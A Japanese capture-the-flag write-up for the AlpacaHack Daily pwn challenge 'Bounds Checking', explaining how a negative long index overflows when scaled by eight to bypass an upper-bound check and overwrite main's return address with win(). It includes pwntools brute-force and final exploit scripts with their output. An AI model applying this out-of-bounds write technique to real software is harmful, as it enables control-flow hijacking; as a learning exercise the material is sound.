---
title: "Bounds Checking - AlpacaHack Daily"
category: "pwn"
subcategory: "pwn"
type: "writeup"
tags: ["pwn", "alpacahack", "scanf", "bounds", "checking", "binary-exploitation"]
summary: "pwn writeup for \"Bounds Checking\" from AlpacaHack Daily - techniques: alpacahack, scanf, bounds, checking, binary-exploitation."
source:
  name: "baumroll0928-spec/myRepository"
  url: "https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d10_Bounds_Checking/README.md"
ctf:
  name: "AlpacaHack Daily"
  year: 2026
  challenge: "Bounds Checking"
---

## Source

- **CTF:** AlpacaHack Daily
- **Challenge:** Bounds Checking
- **Date:** 2026-05-10
- **Repository:** [baumroll0928-spec/myRepository](https://github.com/baumroll0928-spec/myRepository)
- **Directory:** <https://github.com/baumroll0928-spec/myRepository/tree/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d10_Bounds_Checking>
- **File:** <https://github.com/baumroll0928-spec/myRepository/blob/a7f1cdb83e529deb9dad77ce670a12fc7209ab07/Daily_AlpacaHack/m202605/d10_Bounds_Checking/README.md>

---
# Bounds Checking

## 問題

配列のサイズに収まる添字なので安全です！
```c
void win(void) {
  char buf[100];
  FILE* f = fopen("./flag.txt", "r");
  fgets(buf, 100, f);
  puts(buf);
  fclose(f);
  exit(0);
}

int main(void) {
  long array[0x100] = {};

  long index = 0;
  printf("index: ");
  scanf("%ld", &index);
  if (index >= 0x100) {
    puts("Too large index.");
    exit(1);
  }

  long value = 0;
  printf("value: ");
  scanf("%ld", &value);
  array[index] = value;
}
```

## 概要

`main`関数では、２つのlong型（符号付64ビット整数）の変数`index`と`value`を入力する機会が与えられます。

その後入力した値をもとにサイズが`0x100 = 256`の配列`array`に代入しています。

しかし、`main`関数でしていることはそれだけで、フラグを表示してくれる`win`関数を呼び出しているところはどこにもありません。

どうすればフラグを得ることができるのでしょうか？

## 解法

`main`関数の戻り先アドレスを書き換えたいところですが、
```c
  if (index >= 0x100) {
    puts("Too large index.");
    exit(1);
  }
```
によってその方法が禁止されているようです。（スタックは下に伸びるため。）

12月5日の過去問`Integer Writer`では、`main`関数ではなく`scanf`関数の戻り先を書き換えることでフラグを取っていました。

しかし、今回の問題では、`scanf`で直接書き換えることはせず、`main`関数に戻ってきてから配列の代入をしているので、この方法も使えません。

完全に詰みました。

しかしここで悪知恵が働きました。

「`index < 0`を使うのは間違いなさそう。それなら、`index`を`-1`の付近の負数と`long`型の最小値あたりで回してひたすら`win`関数のアドレスを書き込み続ければフラグを得られるんじゃないかな？」

まず、`win`関数のアドレスを調べます。
```sh
$ nm chal | grep win
0000000000401236 T win
```
`win`関数のアドレスが`0x401236 = 4198966`であることがわかりました。

さっそく`-1`付近から試してみます。

```py
import pwn

HOST, PORT = "localhost", 1337

for i in range(1024):
    print(f"{i = }")
    p = pwn.remote(HOST, PORT)
    p.sendlineafter(b': ', str(-i).encode())
    p.sendlineafter(b': ', b'4198966')
    d = p.recvall()
    p.close()
    if b'Alpaca{' in d:
        print(d)
        break
```

これでは見つかりませんでした。

次に、`index`の値として送るデータの部分を
```py
    p.sendlineafter(b': ', str(i - pow(2,63)).encode())
```
に書き換え、`long`型の最小値付近を探ってみます。（`long`型の範囲は$`-2^{63}`$ ～ $`2^{63}-1`$です。）

すると、
```
...
i = 258
[x] Opening connection to localhost on port 1337
[x] Opening connection to localhost on port 1337: Trying ::1
[+] Opening connection to localhost on port 1337: Done
[x] Receiving all data
[x] Receiving all data: 0B
[+] Receiving all data: Done (0B)
[*] Closed connection to localhost port 1337
i = 259
[x] Opening connection to localhost on port 1337
[x] Opening connection to localhost on port 1337: Trying ::1
[+] Opening connection to localhost on port 1337: Done
[x] Receiving all data
[x] Receiving all data: 0B
[x] Receiving all data: 26B
[+] Receiving all data: Done (26B)
[*] Closed connection to localhost port 1337
b'Alpaca{*** REDACTED ***}\n\n'
```
出ました！

`i = 259`のときにフラグが取れるようなので、そのときの`index`は、$`259 - 2^{63} = -9223372036854775549`$となります。

```py
import pwn

#HOST, PORT = "localhost", 1337
HOST, PORT = "34.170.146.252", 22958

p = pwn.remote(HOST, PORT)
p.sendlineafter(b': ', str(259 - pow(2,63)).encode())
p.sendlineafter(b': ', '4198966'.encode())
print(p.recvall().decode())
```

## 補足

フラグは取れたものの、なぜこれでいけたのか理由がわかるまでにだいぶ時間がかかりました。

`long`型のサイズは`8`バイトなので、`long`型配列`array`の各要素のアドレスは先頭のアドレスを基準に添え字の`8`倍の相対位置として扱われます。

先ほど出てきた$`-9223372036854775549 = -2^{63} + 259`$という数値ですが、`8`倍するとオーバーフローして`259`の`8`倍になります。
```py
index = -9223372036854775549
adr = (index * 8) & ((1 << 64) - 1) # 下位64ビットを取ることで疑似的にオーバーフローを起こす
print(adr) # 2072
```
よって、`index = -9223372036854775549`のとき、`&array[index]`は`&array[259]`と同じ場所を指すことになります。

配列`array`のサイズは`256`なので、パディング、スタックカナリア、ベースポインタ退避の分を考えると、この`259`という値は戻り先アドレスの場所としては良い感じです。

実際、`if (index >= 0x100) { ... }`のバリデーションチェックを削除してコンパイル、実行してみると、`index: 259`でいけました。

以上から、入力の制約が無い負数のインデックスを入力することで特定の正数のインデックスを指定でき、戻り先アドレスを書き換えることができたことがわかります。

## その他

今回の問題、難しすぎて全くわからないけどズルしてフラグを取れてしまいました。

まあCTFではフラグさえ取れれば勝ちということで許してくださいm(_ _)m

ちゃんとした解き方については他の方のWriteupを見て勉強しようと思います。
